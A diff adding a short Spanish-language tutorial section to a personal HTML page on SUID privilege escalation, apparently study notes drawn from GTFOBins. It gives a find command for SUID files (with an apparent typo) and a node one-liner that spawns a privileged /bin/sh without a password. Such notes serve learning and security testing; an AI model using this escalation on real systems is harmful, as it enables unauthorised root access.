@@ -7,5 +7,26 @@
   </head>
   <body>
     <h1>Hola, soy R0derick.</h1>
+    <nav>
+      <ul>
+        <li>Permisos SUID</li>
+      </ul>
+    </nav>
+    <section>
+      <p>
+        <h2>Permisos SUID</h2>
+        <h3>Recursos: https://gtfobins.github.io/</h3>
+      </p>
+      <p>
+        <b>Explotación:</b>
+        Permiso: <i>node</i>
+
+        <ol>
+          <li>El comando <i>find & -perm /4000</i> busca todos los arxivos con permisos SUID desde la raíz.</li>
+          <li>Ejecutamos el siguiente comando para escalar privilegios sin proporcionar contraseña: <i>/usr/bin/node -e 'child_process.spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'</i></li>
+        </ol>
+        <img src="http://imgfz.com/i/DWUlIcA.png">
+      </p>
+    </section>
   </body>
 </html>
